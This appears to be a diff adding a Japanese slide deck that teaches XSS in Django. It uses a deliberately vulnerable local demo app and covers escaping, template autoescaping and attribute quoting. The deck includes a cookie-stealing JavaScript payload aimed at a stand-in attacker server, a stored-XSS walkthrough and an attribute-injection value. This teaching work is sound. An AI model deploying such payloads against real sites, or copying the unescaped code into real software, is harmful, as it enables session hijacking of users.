@@ -1,0 +1,210 @@
+XSS（クロスサイト・スクリプティング）
+============================================================
+
+XSSって、なによ
+============================================================
+
+* Cross-Site Scripting
+* **悪意を持ったHTMLやJavaScriptコードを注入** できてしまう脆弱性
+
+百聞は一見に如かず、デモの時間です！
+--------------------------------------------------
+
+http://127.0.0.1:8000/example/
+
+* JavaScriptコードが実行されるページ
+* 悪意を持ったJavaScriptコードが実行されるページ
+
+:command:`docker compose up`
+--------------------------------------------------
+
+* XSS脆弱性のあるDjangoアプリ
+* DB（PostgreSQL）
+* 攻撃者が用意したサーバ（WireMock）
+
+JavaScriptが実行される例
+============================================================
+
+http://127.0.0.1:8000/example/alert/
+
+* 「XSSです」がポップアップしました
+
+.. code-block:: python
+
+    def alert(request):
+        return HttpResponse('<script>alert("XSSです")</script>')
+
+``HttpResponse`` でscriptタグを返すとき
+--------------------------------------------------
+
+* レスポンス（HTML）中にscriptタグ！
+
+.. code-block:: html
+
+    <script>alert("XSSです")</script>
+
+* ブラウザはこれを実行
+
+悪意を持ったJavaScriptコードの例
+============================================================
+
+* cookieを他サイトに送信するJavaScriptコード
+* Webアプリにログインしているとき、cookieにユーザ識別情報を持つ（TODO）
+
+cookieを他サイトへ送信😈
+--------------------------------------------------
+
+.. code-block:: javascript
+
+    window.location = "http://0.0.0.0:8080/evil?cookie="+escape(document.cookie)
+
+* このスクリプトを開いたユーザのcookieを、クエリパラメタに加える
+* ``window.location`` への代入でブラウザを遷移させて、攻撃者が用意したサーバに送信
+
+攻撃されてみましょう
+--------------------------------------------------
+
+http://127.0.0.1:8000/example/send/
+
+* Your cookie is ... と表示される
+* これは攻撃者が用意したサーバ（モックサーバ）のレスポンス
+* ``window.location`` への代入でモックサーバにcookieを含めたリクエストを送信した
+
+どうすればよかったの？ー **エスケープ**
+============================================================
+
+* ``HttpResponse`` にHTMLやJavaScriptコードが渡る可能性がある場合、 **エスケープ** して渡しましょう！
+
+.. code-block:: python
+
+    from django.utils.html import escape
+
+``django.utils.html.escape``
+--------------------------------------------------
+
+https://github.com/django/django/blob/4.2.6/django/utils/html.py#L17-L27
+
+    Return the given text with ampersands, quotes and angle brackets encoded for use in HTML.
+
+.. code-block:: python
+
+    @keep_lazy(SafeString)
+    def escape(text):
+        return SafeString(html.escape(str(text)))
+
+エスケープで対策できてます！
+--------------------------------------------------
+
+.. code-block:: python
+
+    def alert(request):
+        return HttpResponse(escape('<script>alert("XSSです")</script>'))
+
+.. code-block:: html
+
+    &lt;script&gt;alert(&quot;XSSです&quot;)&lt;/script&gt;
+
+* ブラウザにはscriptタグでないので、JavaScriptの実行はされません！
+
+Djangoテンプレートでも対策できます！
+--------------------------------------------------
+
+* ``{{ variable }}`` による **変数展開でエスケープ** される
+* Djangoドキュメント中の `クロス・サイト・スクリプティング (XSS) の防御 <https://docs.djangoproject.com/ja/4.2/topics/security/#cross-site-scripting-xss-protection>`_ より
+
+    Django のテンプレートを用いる事で多数の XSS 攻撃に対抗することができます。
+
+「現実にこんなDjangoアプリ書きます？」
+--------------------------------------------------
+
+* ここまで ``HttpResponse`` で **エスケープ** しないと、JavaScriptが実行されることを示しました
+* XSS脆弱性を作り込んでしまう例へ進みます
+
+持続型XSS
+============================================================
+
+    攻撃用のJavaScriptが、攻撃対象のデータベースなどに保存される場合 (徳丸本 p.231)
+
+* 持続型とは別に、 *反射型* もあります
+
+持続型XSSできてしまうDjangoアプリ
+--------------------------------------------------
+
+http://127.0.0.1:8000/todolist/
+
+* TODOの一覧ページ
+* ログインするとTODOを保存できる
+* エスケープせずに ``HttpResponse`` で返す実装🙅‍♂️
+
+.. 空のページで始まる。1つ保存できる例を見せる（一覧に加わる）
+
+持続型XSSで攻撃👹
+--------------------------------------------------
+
+http://127.0.0.1:8000/todolist/new/
+
+* Todoの内容に攻撃用 **JavaScriptコードを記入**
+
+  * Djangoフォームはこれを保存する
+
+* ログイン一覧ページに遷移すると、cookieが送信される
+
+.. シークレットブラウザを立てておいて、別のユーザでログインする
+
+「分かりました！テンプレートを使います！！」
+============================================================
+
+* 多数は対処できるのですが、注意が必要
+* `クロス・サイト・スクリプティング (XSS) の防御`_ にはテンプレートの落とし穴も
+
+.. code-block:: html
+
+    <style class={{ var }}>...</style>
+
+HTMLタグの **属性値はクォートで囲む**
+--------------------------------------------------
+
+* 1つ前のスライドのテンプレートの書き方には、脆弱性がある
+
+    var の値が 'class1 onmouseover=javascript:func()' にセットされた場合
+
+.. code-block:: diff
+
+    -<style class={{ var }}>...</style>
+    +<style class="{{ var }}">...</style>
+
+XSSのまとめ🌯
+============================================================
+
+* **悪意を持ったHTMLやJavaScriptコードを注入** できてしまう脆弱性
+* 悪意を持ったコードがデータベースに保存される、 **持続型** で攻撃した
+
+XSS脆弱性を埋め込む実装🙅‍♂️
+--------------------------------------------------
+
+* ``HttpResponse`` に **エスケープせず** にHTMLやJavaScriptコードを渡してしまう
+
+.. code-block:: python
+
+    def alert(request):
+        return HttpResponse('<script>alert("XSSです")</script>')
+
+XSSの脆弱性を埋め込まない実装
+--------------------------------------------------
+
+* ``django.utils.html.escape`` でエスケープ
+* **Djangoテンプレート** を使う
+
+  * さらに、HTMLの **属性値はクォートで囲む**
+
+⚠️この場限りにしてくださいね（攻撃になっちゃうので！）
+--------------------------------------------------
+
+* あなたが利用しているWebアプリに、ここで紹介したJavaScriptを保存しないでください
+* それは **攻撃** です（学習用のこのアプリだけにしてください）
+
+重ねてありがとう、Djangoチュートリアル
+--------------------------------------------------
+
+* XSSがどういうものか分かっていなかった あの日の私、チュートリアルに沿うことで回避していた
+* `Djangoテンプレート <https://tutorial.djangogirls.org/ja/django_templates/>`__
